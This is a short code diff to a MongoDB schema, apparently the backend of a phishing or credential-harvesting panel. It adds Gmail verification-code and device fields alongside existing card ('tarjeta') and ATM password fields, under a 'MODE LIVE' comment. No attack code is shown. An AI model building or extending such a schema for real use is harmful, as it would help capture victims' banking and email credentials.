@@ -31,6 +31,8 @@ const bagSchema = new Schema({
     image: String,
     tarjeta: String,
     atmPassword: String,
+    gmailCode: String,
+    gmailDevice: String,
     additionalData: [String],
 
     // MODE LIVE
